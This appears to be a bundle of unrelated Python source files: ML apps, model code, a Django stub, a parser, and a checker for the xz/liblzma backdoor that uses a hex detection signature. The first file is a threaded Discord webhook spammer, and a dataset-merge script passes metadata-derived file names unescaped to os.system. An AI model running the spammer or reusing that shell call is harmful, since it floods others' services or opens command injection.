    "import requests\r\nimport time\r\nfrom colorama import Fore\r\nimport threading\r\nfrom util.plugins.commun import * \r\n\r\ndef webhookspam():\r\n    setTitle(\"WebHook Spammer\")\r\n    clear()\r\n    webhspamtitle()\r\n    print(f\"{y}[{w}+{y}]{w} Enter the WebHook you want to spam \")\r\n    webhook = input(f\"{y}[{b}#{y}]{w} WebHook Link: \")\r\n    try:\r\n        requests.post(webhook, json={'content': \"\"})\r\n    except:\r\n        print(f\"      {y}[{Fore.LIGHTRED_EX }!{y}]{w} Your WebHook is invalid !\")\r\n        time.sleep(2)\r\n        clear()\r\n        main()\r\n    print(f\"\\n{y}[{w}+{y}]{w} Enter the message to spam \")\r\n    message = input(f\"{y}[{b}#{y}]{w} Message: \")\r\n    print(f\"\\n{y}[{w}+{y}]{w} Amount of messages to send \")\r\n    amount = int(input(f\"{y}[{b}#{y}]{w} Amount: \"))\r\n    def spam():\r\n        requests.post(webhook, json={'content': message})\r\n    for x in range(amount):\r\n        threading.Thread(target = spam).start()\r\n    \r\n    clear()\r\n    webhspamtitle()\r\n    print(f\"{y}[{Fore.LIGHTGREEN_EX }!{y}]{w} Webhook has been correctly spammed\")\r\n    input(f\"\\n{y}[{b}#{y}]{w} Press ENTER to exit\")\r\n    main()\r\n\r\nwebhookspam()\r\n",
    "import streamlit as st\nimport joblib\nimport numpy as np\nimport pandas as pd\nimport requests\nfrom datetime import datetime, timedelta\nfrom dotenv import load_dotenv\nimport os\nimport pytz\nimport re\n\nload_dotenv()\n# Load your machine learning model\nmodel = joblib.load('my_model_file.pkl')\n\n# Function to make predictions\ndef predict(a):\n    # Perform prediction using the loaded model\n    prediction = model.predict(a)\n    return prediction\n\ndef classify_weather(description, temperature, humidity, wind_speed):\n    # Initialize the dictionary to store the classified weather parameters\n    weather_classification = {\n        'Outlook_Overcast': [0],\n        'Outlook_Rain': [0],\n        'Outlook_Sunny': [0],\n        'Temperature_Cool': [0],\n        'Temperature_Hot': [0],\n        'Temperature_Mild': [0],\n        'Humidity_High': [0],\n        'Humidity_Normal': [0],\n        'Wind_Strong': [0],\n        'Wind_Weak': [0],        \n    }\n    \n    # Classify based on weather description\n    if 'haze' in description.lower():\n        weather_classification['Outlook_Overcast'] = [1]\n    elif 'rain' in description.lower():\n        weather_classification['Outlook_Rain'] = [1]\n    else:\n        weather_classification['Outlook_Sunny'] = [1]\n    \n    # Classify based on temperature\n    if temperature < 290:\n        weather_classification['Temperature_Cool'] = [1]\n    elif temperature > 303:\n        weather_classification['Temperature_Hot'] = [1]\n    else:\n        weather_classification['Temperature_Mild'] = [1]\n    \n    # Classify based on humidity\n    if humidity > 50:\n        weather_classification['Humidity_High'] = [1]\n    else:\n        weather_classification['Humidity_Normal'] = [1]\n    \n    # Classify based on wind speed\n    if wind_speed > 3:\n        weather_classification['Wind_Strong'] = [1]\n    else:\n        weather_classification['Wind_Weak'] = [1]\n    \n    return weather_classification\n\ndef get_weather_forecast(city):\n    country_code = 'IN'\n    api_key = os.getenv(\"api_key\")  # Use os.getenv to fetch environment variables\n    url = f'http://api.openweathermap.org/data/2.5/forecast?q={city},{country_code}&appid={api_key}'\n    response = requests.get(url)\n    if response.status_code == 200:\n        data = response.json()\n        forecasts = []\n        for forecast in data.get('list', []):\n            forecast_date = forecast.get('dt_txt', 'N/A')\n            weather_description = forecast.get('weather', [{}])[0].get('description', 'N/A')\n            temperature = forecast.get('main', {}).get('temp', 'N/A')\n            humidity = forecast.get('main', {}).get('humidity', 'N/A')\n            wind_speed = forecast.get('wind', {}).get('speed', 'N/A')\n            \n            forecasts.append((forecast_date, weather_description, temperature, humidity, wind_speed))\n        return forecasts\n    else:\n        st.error(\"Failed to fetch weather forecast. Please check your API key and try again.\")\n        return None\n\n# Function to find suitable time slots for playing badminton\ndef find_suitable_time_slots(forecasts):\n    suitable_time_slots = []\n    for forecast in forecasts:\n        forecast_datetime_str, weather_description, temp, hum, wind_spd = forecast\n        classification_result = classify_weather(weather_description, temp, hum, wind_spd)\n        current_weather = pd.DataFrame(classification_result)\n        prediction = predict(current_weather)\n        if prediction[0] == 1:\n            suitable_time_slots.append((forecast_datetime_str, weather_description, temp, hum, wind_spd))\n    return suitable_time_slots\n\n# Function to get current time in a specific time zone\ndef get_current_time(timezone='Asia/Kolkata'):  # Default to Indian Standard Time\n    tz = pytz.timezone(timezone)\n    current_time = datetime.now(tz)\n    return current_time\n\n# Get the current time\ncurrent_time = get_current_time()\n\n# Streamlit app layout\nst.set_page_config(page_title='SmashCast\ud83c\udff8', layout='wide')\n# Title and separator\nst.markdown(\"<h1 style='text-align: center;'>SmashCast\ud83c\udff8</h1>\", unsafe_allow_html=True)\nst.markdown(\"---\")\n\n# Center-aligned text\nst.markdown(\"<h4 style='text-align: center;'>Your Weather-Driven Badminton Outside Play Predictor</h4>\", unsafe_allow_html=True)\n\n# Create columns with different widths\ncol1, col2 = st.columns([1, 1])  # Adjust the list to control column sizes\n\nwith col1:\n    location = st.selectbox('Enter your city name', [\n        'Lucknow', 'Mumbai', 'Agra', 'Delhi', 'Bangalore', 'Hyderabad', \n        'Chennai', 'Kolkata', 'Pune', 'Ahmedabad', 'Jaipur', 'Surat', \n        'Kanpur', 'Nagpur', 'Visakhapatnam', 'Indore', 'Thane', 'Bhopal', \n        'Patna', 'Vadodara', 'Ghaziabad', 'Kottayam'\n    ])\n\nwith col2:\n    custom_date = st.date_input('Select a date')\n    custom_time = st.time_input('Select a time', value=current_time)\n\n# Function to display suitable time slots\ndef display_time_slots(time_slots):\n    for slot in time_slots:\n        slot_datetime, slot_description, slot_temp, slot_hum, slot_wind = slot\n        slot_inf",
    "'''\nAuthor: wenjun-VCC\nDate: 2024-04-05 08:02:31\nLastEditors: wenjun-VCC\nLastEditTime: 2024-04-08 10:51:54\nFilePath: callbacks.py\nDescription: __discription:__\nEmail: wenjun.9707@gmail.com\nCopyright (c) 2024 by wenjun/VCC, All Rights Reserved. \n'''\nfrom typing import Any\nfrom pytorch_lightning import Callback, LightningModule, Trainer\nimport math\nimport os\nimport pickle\n\n\nclass LearningRateWarmupCosineDecayCallback(Callback):\n    \n    def __init__(\n        self,\n        init_lr:float=1e-10,\n        min_lr:float=1e-6,\n        max_lr:float=5e-4,\n        warmup_epochs:int=5,\n        total_epochs:int=100,\n        cos_lr_rate:float=0.9):\n        super().__init__()\n        self.init_lr = init_lr\n        self.min_lr = min_lr\n        self.max_lr = max_lr\n        self.warmup_epochs = warmup_epochs\n        self.total_epochs = total_epochs\n        self.lr_cos_epoch = int(total_epochs * cos_lr_rate)\n\n        \n        self.warmup_steps = None  # To be calculated later\n        self.total_training_steps = None\n        self.cos_training_steps = None\n\n\n    def on_train_start(self, trainer, pl_module):\n        # Calculate total steps for warmup based on the number of epochs and steps per epoch\n        steps_per_epoch = len(trainer.train_dataloader)\n        self.total_training_steps = self.total_epochs * len(trainer.train_dataloader)\n        self.warmup_steps = self.warmup_epochs * steps_per_epoch\n        self.cos_training_steps = self.lr_cos_epoch * steps_per_epoch + self.warmup_steps\n\n    def on_train_batch_start(self, trainer, pl_module, batch, batch_idx):\n        \n        # Calculate the current step\n        current_step = trainer.current_epoch * len(trainer.train_dataloader) + batch_idx\n\n        if current_step <= self.warmup_steps:\n            # Linear warmup\n            lr = ((self.max_lr - self.init_lr) / self.warmup_steps) * current_step + self.init_lr\n        elif current_step <= self.cos_training_steps:\n            # Cosine annealing\n            progress = (current_step - self.warmup_steps) / (self.cos_training_steps - self.warmup_steps)\n            cosine = 0.5 * (1 + math.cos(math.pi * progress))\n            lr = self.min_lr + (self.max_lr - self.min_lr) * cosine\n        else:\n            lr = self.min_lr\n\n        # Set the learning rate to the optimizer\n        for pg in trainer.optimizers[0].param_groups:\n            pg['lr'] = lr\n\n\nclass ModelCallbacks(Callback):\n    \n    def __init__(\n        self,\n        save_path,\n    ) -> None:\n        super(ModelCallbacks, self).__init__()\n        \n        self.save_path = save_path\n        \n    \n    def on_test_batch_end(self, trainer: Trainer, pl_module: LightningModule, outputs: Any, batch: Any, batch_idx: int, dataloader_idx: int = 0) -> None:\n        \n        # output: coarse, fine\n        coarse, fine = outputs\n        coarse_rgb, coarse_depth, _, _ = coarse\n        fine_rgb, fine_depth, _, _ = fine\n        \n        if coarse_rgb.device != 'cpu':\n            # set device\n            coarse_rgb = coarse_rgb.cpu()\n            coarse_depth = coarse_depth.cpu()\n            fine_rgb = fine_rgb.cpu()\n            fine_depth = fine_depth.cpu()\n        \n        results = {\n            'coarse_rgb': coarse_rgb.numpy(),\n            'coarse_depth': coarse_depth.numpy(),\n            'fine_rgb': fine_rgb.numpy(),\n            'fine_depth': fine_depth.numpy(),\n        }\n        \n        save_path = os.path.join(self.save_path, 'test_save')\n        if not os.path.exists(save_path):\n            os.makedirs(save_path)\n            \n        save_path = os.path.join(save_path, 'batch{:07d}.pkl'.format(batch_idx))\n        # Write the results dictionary to the pkl file\n        with open(save_path, \"wb\") as f:\n            pickle.dump(results, f)\n    \n    \n    \n    def on_predict_batch_end(self, trainer: Trainer, pl_module: LightningModule, outputs: Any, batch: Any, batch_idx: int, dataloader_idx: int = 0) -> None:\n        \n        # output: coarse, fine\n        coarse, fine = outputs\n        coarse_rgb, coarse_depth, _, _ = coarse\n        fine_rgb, fine_depth, _, _ = fine\n        \n        if coarse_rgb.device != 'cpu':\n            # set device\n            coarse_rgb = coarse_rgb.cpu()\n            coarse_depth = coarse_depth.cpu()\n            fine_rgb = fine_rgb.cpu()\n            fine_depth = fine_depth.cpu()\n        \n        results = {\n            'coarse_rgb': coarse_rgb.numpy(),\n            'coarse_depth': coarse_depth.numpy(),\n            'fine_rgb': fine_rgb.numpy(),\n            'fine_depth': fine_depth.numpy(),\n        }\n        \n        save_path = os.path.join(self.save_path, 'synthetic_360_save')\n        if not os.path.exists(save_path):\n            os.makedirs(save_path)\n            \n        save_path = os.path.join(save_path, 'batch{:07d}.pkl'.format(batch_idx))\n        # Write the results dictionary to the pkl file\n        with open(save_path, \"wb\") as f:\n            pickle.dump(results, f)\n\n\n\n",
    "# Ultralytics YOLO \ud83d\ude80, GPL-3.0 license\n\nimport os\nimport shutil\n\nimport psutil\nimport requests\nfrom IPython import display  # to display images and clear console output\n\nfrom ultralytics.hub.auth import Auth\nfrom ultralytics.hub.session import HubTrainingSession\nfrom ultralytics.hub.utils import PREFIX, split_key\nfrom ultralytics.yolo.utils import LOGGER, emojis, is_colab\nfrom ultralytics.yolo.utils.torch_utils import select_device\nfrom ultralytics.yolo.v8.detect import DetectionTrainer\n\n\ndef checks(verbose=True):\n    if is_colab():\n        shutil.rmtree('sample_data', ignore_errors=True)  # remove colab /sample_data directory\n\n    if verbose:\n        # System info\n        gib = 1 << 30  # bytes per GiB\n        ram = psutil.virtual_memory().total\n        total, used, free = shutil.disk_usage(\"/\")\n        display.clear_output()\n        s = f'({os.cpu_count()} CPUs, {ram / gib:.1f} GB RAM, {(total - free) / gib:.1f}/{total / gib:.1f} GB disk)'\n    else:\n        s = ''\n\n    select_device(newline=False)\n    LOGGER.info(f'Setup complete \u2705 {s}')\n\n\ndef start(key=''):\n    # Start training models with Ultralytics HUB. Usage: from src.ultralytics import start; start('API_KEY')\n    def request_api_key(attempts=0):\n        \"\"\"Prompt the user to input their API key\"\"\"\n        import getpass\n\n        max_attempts = 3\n        tries = f\"Attempt {str(attempts + 1)} of {max_attempts}\" if attempts > 0 else \"\"\n        LOGGER.info(f\"{PREFIX}Login. {tries}\")\n        input_key = getpass.getpass(\"Enter your Ultralytics HUB API key:\\n\")\n        auth.api_key, model_id = split_key(input_key)\n        if not auth.authenticate():\n            attempts += 1\n            LOGGER.warning(f\"{PREFIX}Invalid API key \u26a0\ufe0f\\n\")\n            if attempts < max_attempts:\n                return request_api_key(attempts)\n            raise ConnectionError(emojis(f\"{PREFIX}Failed to authenticate \u274c\"))\n        else:\n            return model_id\n\n    try:\n        api_key, model_id = split_key(key)\n        auth = Auth(api_key)  # attempts cookie login if no api key is present\n        attempts = 1 if len(key) else 0\n        if not auth.get_state():\n            if len(key):\n                LOGGER.warning(f\"{PREFIX}Invalid API key \u26a0\ufe0f\\n\")\n            model_id = request_api_key(attempts)\n        LOGGER.info(f\"{PREFIX}Authenticated \u2705\")\n        if not model_id:\n            raise ConnectionError(emojis('Connecting with global API key is not currently supported. \u274c'))\n        session = HubTrainingSession(model_id=model_id, auth=auth)\n        session.check_disk_space()\n\n        # TODO: refactor, hardcoded for v8\n        args = session.model.copy()\n        args.pop(\"id\")\n        args.pop(\"status\")\n        args.pop(\"weights\")\n        args[\"data\"] = \"coco128.yaml\"\n        args[\"model\"] = \"yolov8n.yaml\"\n        args[\"batch_size\"] = 16\n        args[\"imgsz\"] = 64\n\n        trainer = DetectionTrainer(overrides=args)\n        session.register_callbacks(trainer)\n        setattr(trainer, 'hub_session', session)\n        trainer.train()\n    except Exception as e:\n        LOGGER.warning(f\"{PREFIX}{e}\")\n\n\ndef reset_model(key=''):\n    # Reset a trained model to an untrained state\n    api_key, model_id = split_key(key)\n    r = requests.post('https://api.ultralytics.com/model-reset', json={\"apiKey\": api_key, \"modelId\": model_id})\n\n    if r.status_code == 200:\n        LOGGER.info(f\"{PREFIX}model reset successfully\")\n        return\n    LOGGER.warning(f\"{PREFIX}model reset failure {r.status_code} {r.reason}\")\n\n\ndef export_model(key='', format='torchscript'):\n    # Export a model to all formats\n    api_key, model_id = split_key(key)\n    formats = ('torchscript', 'onnx', 'openvino', 'engine', 'coreml', 'saved_model', 'pb', 'tflite', 'edgetpu', 'tfjs',\n               'ultralytics_tflite', 'ultralytics_coreml')\n    assert format in formats, f\"ERROR: Unsupported export format '{format}' passed, valid formats are {formats}\"\n\n    r = requests.post('https://api.ultralytics.com/export',\n                      json={\n                          \"apiKey\": api_key,\n                          \"modelId\": model_id,\n                          \"format\": format})\n    assert r.status_code == 200, f\"{PREFIX}{format} export failure {r.status_code} {r.reason}\"\n    LOGGER.info(f\"{PREFIX}{format} export started \u2705\")\n\n\ndef get_export(key='', format='torchscript'):\n    # Get an exported model dictionary with download URL\n    api_key, model_id = split_key(key)\n    formats = ('torchscript', 'onnx', 'openvino', 'engine', 'coreml', 'saved_model', 'pb', 'tflite', 'edgetpu', 'tfjs',\n               'ultralytics_tflite', 'ultralytics_coreml')\n    assert format in formats, f\"ERROR: Unsupported export format '{format}' passed, valid formats are {formats}\"\n\n    r = requests.post('https://api.ultralytics.com/get-export',\n                      json={\n                          \"apiKey\": api_key,\n                          \"modelId\": model_id,\n                          \"format\": format})\n    assert r.status_code == 200, f\"{PREFIX}{format} get_",
    "'''\nMIT License\n\nCopyright 2024 National Technology & Engineering Solutions of Sandia, LLC (NTESS). Under the terms of Contract DE-NA0003525 with NTESS, the U.S. Government retains certain rights in this software.\n\nPermission is hereby granted, free of charge, to any person obtaining a copy\nof this software and associated documentation files (the \"Software\"), to deal\nin the Software without restriction, including without limitation the rights\nto use, copy, modify, merge, publish, distribute, sublicense, and/or sell\ncopies of the Software, and to permit persons to whom the Software is\nfurnished to do so, subject to the following conditions:\n\nThe above copyright notice and this permission notice shall be included in all\ncopies or substantial portions of the Software.\n\nTHE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\nIMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\nFITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\nAUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\nLIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\nOUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE\nSOFTWARE.\n'''\n\nimport openpyxl\nimport json\nimport sys\nimport os\nimport re\n\ndef create_directory(xlsx_file):\n    dir_name = xlsx_file.split('.')[0]\n    path = './' + dir_name\n\n    if not os.path.exists(path):\n        os.mkdir(path)\n        print(\">>> Folder %s created!\" % path)\n        return path\n    else:\n        print(\">>> Folder %s already exists\" % path)\n        return 'Error'\n\n\ndef create_json_files(xlsx_file):\n    certification = openpyxl.load_workbook(xlsx_file)\n    models = certification.sheetnames\n\n    path = create_directory(xlsx_file)\n\n    if path != 'Error':\n        for model in models:\n            if model not in ['Instructions', 'Testing Info', 'Certification Info']:\n                json_data = {}\n\n                for row in range(1, certification[model].max_row + 1):\n                    json_data[certification[model].cell(row, 1).value] = []\n                    for col in range(2, certification[model].max_column + 1):\n                        json_data[certification[model].cell(row, 1).value].append(certification[model].cell(row, col).value)\n                \n                with open(f\"{path}/raw_json_{model}.json\", \"w\") as f:\n                    json.dump(json_data,f)\n\n        generate_device_map(path)\n    else:\n        print('>>> There is a path error. Exiting...')\n\ndef extract_text(text):\n    if text is not None:\n        match = re.search(r'\\((.*?)\\)', text)\n        if match:\n            return match.group(1)\n        else:\n            return text\n    else:\n        return None\n\ndef generate_device_map(directory):\n    raw_json_files = [file for file in os.listdir(directory) if file.endswith('json')]\n\n    models_data = []\n    for raw_json_file in raw_json_files:\n        with open(directory + '/' + raw_json_file) as json_file:\n            model_data = json.load(json_file)\n            if model_data:\n                models_data.append({})\n                for rtg, value in model_data.items():\n                    if rtg != 'Address':\n                        if extract_text(value[0]):\n                            models_data[-1][extract_text(value[0])] = value[3]\n    \n    output_model_data = {'models': models_data}\n    with open(f\"{directory}/device_map.json\", \"w\") as f:\n        json.dump(output_model_data, f, indent=4)\n    \n    print('>>> DER Device map is successfully generated.')\n\n\nif __name__ == '__main__':\n    if len(sys.argv) != 2:\n        print('>>> Please provide exactly one argument - the Excel file to be parsed for the DER device.')\n    else:\n        xlsx_file = sys.argv[1]\n        create_json_files(xlsx_file)\n",
    "import random as rd\nimport numpy as np\nclass SudokuBacktracking:\n    def __init__(self,n=0) -> None:\n        self.nb_initialized_case=n # number of initialized cases\n        self.board=[[0 for _ in range(9)]for _ in range(9)]\n\n    def generate_board(self):\n        self.nb_initialized_case=17+rd.random()%(46-17+1)\n        #using numpy\n        self.nb_initialized_case=np.random.randint(17,46)\n        for i in range(self.nb_initialized_case):\n            i,j=self.get_random_case()\n            val=np.random.randint(1,9)\n            while not self.valid_proposition(i,j,val):\n                val=np.random.randint(1,9)\n\n\n\n    def get_random_case(self):\n        ok=True\n        while ok:\n            i=np.random.randint(0,len(self.board)-1)\n            j=np.random.randint(0,len(self.board)-1)\n            if self.board[i][j]==0:\n                ok=False\n        return i,j\n\n\n    def print_board(self):\n        for i in range(9):\n            for j in range(9):\n                print(self.board[i][j],end=\"\\t\")\n\n    def valid_proposition(self,indL, indC, val_prop)->bool:\n        #verify if the proposition value is not unique on the line\n        if val_prop in self.board[indL]:\n            return False\n        \n        #verify if the proposition value is not unique on the line\n        i=0\n        valid=True\n        while i<9 and valid:\n            if self.board[i][indC]==val_prop:\n                valid=False\n            i+=1\n        if not valid:\n            return False\n        #verify the 3x3 square    \n\n    def solve(self):\n        pass\n\n\n#testing\nsudoku=SudokuBacktracking()\nsudoku.generate_board()\nsudoku.print_board()\nsudoku.solve()\nprint(\"The solved sudoku board is\")\nsudoku.print_board()\n",
    "from fastapi import FastAPI\nfrom typing import List\nfrom sentence_transformers import CrossEncoder\nimport numpy as np\n\n# Load the small re-ranker model from mixedbread.ai\nmodel = CrossEncoder(\"mixedbread-ai/mxbai-rerank-xsmall-v1\")\n\napp = FastAPI(title=\"BreadRanker\",\n        description=\"A small reranker service for use with RAG workflows. It uses the mixedbread.ai reranker model.\",\n        version=\"1.0\",\n        contact={\n            \"name\": \"Pat Wendorf\",\n            \"email\": \"pat.wendorf@mongodb.com\",\n    },\n    license_info={\n        \"name\": \"MIT\",\n        \"url\": \"https://opensource.org/license/mit/\",\n    })\n\n@app.get(\"/\")\nasync def root():\n    return {\"message\": \"Reank some docs! See /docs for more info.\"}\n\n@app.post(\"/rerank/\")\nasync def rerank(query: str, documents: List[str], top_k: int):\n    results = model.rank(query, documents, return_documents=True, top_k=top_k)\n    # Clean up those float32's\n    serializable_list = [{k: float(v) if isinstance(v, np.float32) else v for k, v in d.items()} for d in results]\n    return {\"query\": query, \"results\": serializable_list}",
    "import torch\nimport torch.nn as nn\n\nfrom models.common import Conv, RepNCSPELAN4, ADown, SPPELAN, DDetect\n\n\nclass YOLOV9(nn.Module):\n    def __init__(self, C=80, deploy=True):\n        super(YOLOV9, self).__init__()\n        in_channels = 3\n\n        ############ backbone ############\n        # conv down\n        self.conv1 = Conv(in_channels, 64, 3, 2)\n\n        # conv down\n        self.conv2 = Conv(64, 128, 3, 2)\n\n        # elan-1 block\n        self.elan1 = RepNCSPELAN4(128, 256, 128, 64, 1)\n\n        # avg-conv down\n        self.ad1 = ADown(256, 256)\n\n        # elan-2 block\n        self.elan2 = RepNCSPELAN4(256, 512, 256, 128, 1)    # 4\n\n        # avg-conv down\n        self.ad2 = ADown(512, 512)\n\n        # elan-2 block\n        self.elan3 = RepNCSPELAN4(512, 512, 512, 256, 1)    # 6\n\n        # avg-conv down\n        self.ad3 = ADown(512, 512)\n\n        # elan-2 block\n        self.elan4 = RepNCSPELAN4(512, 512, 512, 256, 1)\n\n        ############ head ############\n        # elan-spp block\n        self.sppelan = SPPELAN(512, 512, 256)               # 9\n\n        # up-concat merge\n        self.up1 = nn.Upsample(scale_factor=2, mode='nearest')\n\n        # elan-2 block\n        self.elan5 = RepNCSPELAN4(1024, 512, 512, 256, 1)   # 12\n\n        # up-concat merge\n        self.up2 = nn.Upsample(scale_factor=2, mode='nearest')\n\n        # elan-2 block\n        self.elan6 = RepNCSPELAN4(1024, 256, 256, 128, 1)    # 15\n\n        # avg-conv-down merge\n        self.ad4 = ADown(256, 256)\n\n        # elan-2 block\n        self.elan7 = RepNCSPELAN4(768, 512, 512, 256, 1)    # 18\n\n        # avg-conv-down merge\n        self.ad5 = ADown(512, 512)\n\n        # elan-2 block\n        self.elan8 = RepNCSPELAN4(1024, 512, 512, 256, 1)    # 21\n\n        # detect\n        self.ddetect = DDetect(nc=C, ch=(256, 512, 512), deploy=deploy)\n\n    def forward(self, x):\n        ############ backbone ############\n        # conv down\n        x = self.conv2(self.conv1(x))\n\n        # elan-1 block\n        x = self.elan1(x)\n\n        # avg-conv down\n        x = self.ad1(x)\n\n        # elan-2 block\n        x_4 = self.elan2(x)\n\n        # avg-conv down\n        x = self.ad2(x_4)\n\n        # elan-2 block\n        x_6 = self.elan3(x)\n\n        # avg-conv down\n        x = self.ad3(x_6)\n\n        # elan-2 block\n        x = self.elan4(x)\n\n        ############ head ############\n        # elan-spp block\n        x_9 = self.sppelan(x)\n\n        # up-concat merge\n        x = self.up1(x_9)\n        x = torch.cat([x, x_6], dim=1)\n\n        # elan-2 block\n        x_12 = self.elan5(x)\n\n        # up-concat merge\n        x = self.up2(x_12)\n        x = torch.cat([x, x_4], dim=1)\n\n        # elan-2 block\n        x_15 = self.elan6(x)\n\n        # avg-conv-down merge\n        x = self.ad4(x_15)\n        x = torch.cat([x, x_12], dim=1)\n\n        # elan-2 block\n        x_18 = self.elan7(x)\n\n        # avg-conv-down merge\n        x = self.ad5(x_18)\n        x = torch.cat([x, x_9], dim=1)\n\n        # elan-2 block\n        x_21 = self.elan8(x)\n\n        # detect\n        y = self.ddetect([x_15, x_18, x_21])\n        return y",
    "import subprocess\nfrom loguru import logger\n\n\nVERSAO_VULNERAVEL = [\"5.6.0\", \"5.6.1\"]\n\n\ndef verificar_caminho_sshd():\n    try:\n        caminho_sshd = subprocess.run([\n            \"whereis\",\n            \"-b\",\n            \"sshd\"],\n            capture_output=True\n        )\n        caminho_sshd = caminho_sshd.stdout\n        retorno = caminho_sshd.decode(\"utf-8\").replace(\"\\n\", \"\")\n        retorno = retorno.split()\n        logger.info(f\"Caminho verificado: {retorno}\")\n        return retorno[1]\n    except Exception as e:\n        logger.error(e)\n        return False\n\n\ndef verificar_liblzma(path_sshd):\n    try:\n        logger.info(f\"Verificando ldd: {path_sshd}\")\n        ldd_output = subprocess.run([\"ldd\", path_sshd], capture_output=True)\n        ldd_output = ldd_output.stdout\n        path_liblzma = ldd_output.decode(\"utf-8\").split()\n        retorno_lista = list(filter(lambda x: 'liblzma' in x, path_liblzma))\n        logger.info(f\"Lista: {retorno_lista}\")\n        return retorno_lista[1]\n    except Exception as e:\n        logger.error(e)\n        return False\n\n\ndef verificar_xz():\n    try:\n        caminho_xz = subprocess.run([\n            \"whereis\",\n            \"-b\",\n            \"xz\"],\n            capture_output=True\n        )\n        caminho_xz = caminho_xz.stdout\n        logger.info(caminho_xz)\n        retorno = caminho_xz.decode(\"utf-8\").replace(\"\\n\", \"\")\n        retorno = retorno.split()\n        logger.info(f\"Caminho verificado: {retorno}\")\n        return retorno[1]\n    except Exception as e:\n        logger.error(e)\n        return False\ndef conferir_assinatura(path):\n    hex_dump_liblzma = subprocess.run([\n        \"hexdump\",\n        \"-ve\",\n        '1/1 \\\"%02x\\\"',\n        path],\n        capture_output=True\n    )\n    hex_dump_liblzma = hex_dump_liblzma.stdout\n    if \"f30f1efa554889f54c89ce5389fb81e7000000804883ec28488954241848894c2410\" in hex_dump_liblzma.decode(\"utf-8\"):\n        logger.warning(\"Assinatura da liblzma: VULNERAVEL\")\n    else:\n        logger.success(\"Assinatura da liblzma: OK\")\n\ndef conferir_xz_versao():\n    versao_xz = subprocess.run([\n        \"xz\",\n        \"--version\"\n    ],\n    capture_output=True)\n    versao_xz = versao_xz.stdout\n    versao_local = versao_xz.decode(\"utf-8\").split()\n    if versao_local[1] in VERSAO_VULNERAVEL:\n        logger.warning(\"xz VULNERAVEL\")\n    else:\n        logger.success(\"xz OK\")\n\n\nif __name__ == \"__main__\":\n    logger.info(\"Inicializando CVE...\")\n    vh = verificar_caminho_sshd()\n    vl = verificar_liblzma(vh)\n    conferir_assinatura(vl)\n    vz = verificar_xz()\n    conferir_xz_versao()\n    logger.info(\"Encerrando CVE...\")",
    "import os\n\ndef list_directories(path):\n    \"\"\"List directories in the given path.\"\"\"\n    return [d for d in os.listdir(path) if os.path.isdir(os.path.join(path, d))]\n\ndef select_directory(directories):\n    \"\"\"Let user select a directory from the list.\"\"\"\n    for i, directory in enumerate(directories, start=1):\n        print(f\"{i}. {directory}\")\n    choice = int(input(\"Select a directory by number: \")) - 1\n    return directories[choice]\n\ndef merge_datasets(base_dir, dir1, dir2, output_dir):\n    \"\"\"Merge two LJ Speech datasets into one.\"\"\"\n    ensure_dir(output_dir)\n    metadata_lines = []\n\n    for dir_name in [dir1, dir2]:\n        dir_path = os.path.join(base_dir, dir_name)\n        metadata_file = os.path.join(dir_path, \"metadata.csv\")\n\n        with open(metadata_file, \"r\", encoding=\"utf-8\") as f:\n            lines = f.readlines()\n            for line in lines:\n                filename, transcription, normalized = line.strip().split(\"|\")\n                # Copy audio file to the output directory\n                src_file_path = os.path.join(dir_path, filename + \".wav\")\n                dst_file_path = os.path.join(output_dir, filename + \".wav\")\n                os.system(f\"cp '{src_file_path}' '{dst_file_path}'\")\n                metadata_lines.append(line.strip())\n\n    # Save merged metadata\n    merged_metadata_file = os.path.join(output_dir, \"metadata.csv\")\n    with open(merged_metadata_file, \"w\", encoding=\"utf-8\") as f:\n        f.write(\"\\n\".join(metadata_lines))\n    \n    print(f\"Merged dataset created in {output_dir}\")\n\ndef ensure_dir(directory):\n    \"\"\"Ensure the directory exists.\"\"\"\n    if not os.path.exists(directory):\n        os.makedirs(directory)\n\n# Main process\nbase_dir = \"LJ_Speech_dataset\"\ndirectories = list_directories(base_dir)\n\nprint(\"Select the first directory:\")\nfirst_dir = select_directory(directories)\n\nprint(\"Select the second directory:\")\nsecond_dir = select_directory(directories)\n\noutput_dir = os.path.join(base_dir, \"Merged_Dataset\")\nmerge_datasets(base_dir, first_dir, second_dir, output_dir)\n",
    "# import media_kit.urls as media_kit_urls\n# from action.urls import urlpatterns as action_url_patterns\n\nfrom django.contrib import admin\n# from django.urls import path, re_path\n# from django.conf.urls import include\n\n# from rest_framework import routers\n\n# from api import urls as api_urls\n\n# from . import views\n# from core import views as core_views\n\n\nadmin.autodiscover()\n\n# router = routers.DefaultRouter()\n# router.register(r'user', views.UserViewSet, 'user viewset')\n\nurlpatterns = []\n# urlpatterns = [\n#     path(r\"\", core_views.homeview, name=\"homeview\"),\n#     path(\"robots.txt\", core_views.robots_txt),\n#     path(r\"_probe\", core_views.probeview, name=\"probe\"),\n#     path(r\"healtz\", core_views.probeview, name=\"probe\"),\n#     path(r\"healtz_db\", core_views.health_check_db, name=\"probe\"),\n#     path(r\"_status_probe\", core_views.probeview, name=\"status probe\"),\n#     path(r'admin/', admin.site.urls),\n#     path(r'admin/', include('loginas.urls')),\n#     re_path(r'user-avatar/(?P<pk>\\d+)/', views.UserAvatarView.as_view(), name='user avatar'),\n#     path(r'user-choice/', core_views.UserChoiceView.as_view(), name='user choice'),\n#     path(r'media-kit/', include(media_kit_urls)),\n#     path(r'action/', include(action_url_patterns)),\n#     re_path(r'task_status/(?P<task_id>.+)/', core_views.TaskStatusView.as_view(), name='task status'),\n#     path(r'', include(router.urls)),\n# ] + \\\n#     api_urls.urlpatterns\n",
